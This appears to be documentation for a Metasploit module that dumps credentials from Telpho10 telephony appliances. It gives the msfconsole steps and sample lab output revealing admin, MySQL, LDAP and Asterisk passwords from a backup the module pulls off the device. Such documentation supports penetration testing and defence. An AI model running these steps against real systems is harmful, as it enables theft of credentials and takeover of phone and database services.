## Vulnerable Application

  Telpho10 v2.6.31 (32-bit Linux ISO image download [here](http://www.telpho.de/downloads/telpho10/telpho10-v2.6.31-SATA.iso)).

  Supporting documentation for this product can be found [here](http://www.telpho.de/downloads.php).

## Verification Steps

  The following steps will allow you to install and dump the credentials from a Telpho10 instance:

  1. Download the [Telpho10 ISO image](http://www.telpho.de/downloads/telpho10/telpho10-v2.6.31-SATA.iso) and install in a VM (or on a system)
    - note that the ISO will default to a German keyboard layout
    - note that the ISO expects a SATA hard drive (not IDE/PATA) for installation
  1. configure the Telpho10's IP address
    - edit /etc/networks/interfaces accordingly
  1. Start msfconsole
  1. Do: ```use auxiliary/admin/http/telpho10_credential_dump```
  1. Do: ```set RHOST <IP address of your Telpho10 instance> ```
  1. Do: ```run```
  1. You should see a list of the retrieved Telpho10 credentials

## Scenarios

  Example output when using this against a Telpho10 v2.6.31 VM:

  ```
$ ./msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.12.36-dev-16fc6c1                 ]
+ -- --=[ 1596 exploits - 908 auxiliary - 273 post        ]
+ -- --=[ 458 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use auxiliary/admin/http/telpho10_credential_dump
msf auxiliary(telpho10_credential_dump) > set RHOST 10.0.2.35
RHOST => 10.0.2.35
msf auxiliary(telpho10_credential_dump) > run

[*] Generating backup
[*] Downloading backup
[+] File saved in: /home/pbarry/.msf4/loot/20161028155202_default_10.0.2.35_telpho10.backup_185682.tar
[*] Dumping credentials

[*] Login (/telpho/login.php)
[*] -------------------------
[+] Username: admin
[+] Password: telpho

[*] MySQL (/phpmyadmin)
[*] -------------------
[+] Username: root
[+] Password: telpho

[*] LDAP (/phpldapadmin)
[*] --------------------
[+] Username: cn=admin,dc=localdomain
[+] Password: telpho

[*] Asterisk MI (port 5038)
[*] -----------------------
[+] Username: telpho
[+] Password: telpho

[*] Mail configuration
[*] ------------------
[+] Mailserver: 
[+] Username:   
[+] Password:   
[+] Mail from:  

[*] Online Backup
[*] -------------
[+] ID:       
[+] Password: 

[*] Auxiliary module execution completed
msf auxiliary(telpho10_credential_dump) > 
```

I navigated my browser to the admin page of the UI and changed some of the password values, then ran the module again to verify I see the updated values:

```
msf auxiliary(telpho10_credential_dump) > run

[*] Generating backup
[*] Downloading backup
[+] File saved in: /home/pbarry/.msf4/loot/20161028161929_default_10.0.2.35_telpho10.backup_044262.tar
[*] Dumping credentials

[*] Login (/telpho/login.php)
[*] -------------------------
[+] Username: admin
[+] Password: s3cr3t

[*] MySQL (/phpmyadmin)
[*] -------------------
[+] Username: root
[+] Password: telpho

[*] LDAP (/phpldapadmin)
[*] --------------------
[+] Username: cn=admin,dc=localdomain
[+] Password: ldaps3cr3t

[*] Asterisk MI (port 5038)
[*] -----------------------
[+] Username: telpho
[+] Password: asterisks3cr3t

[*] Mail configuration
[*] ------------------
[+] Mailserver: 
[+] Username:   
[+] Password:   
[+] Mail from:  

[*] Online Backup
[*] -------------
[+] ID:       
[+] Password: 

[*] Auxiliary module execution completed 
  ```
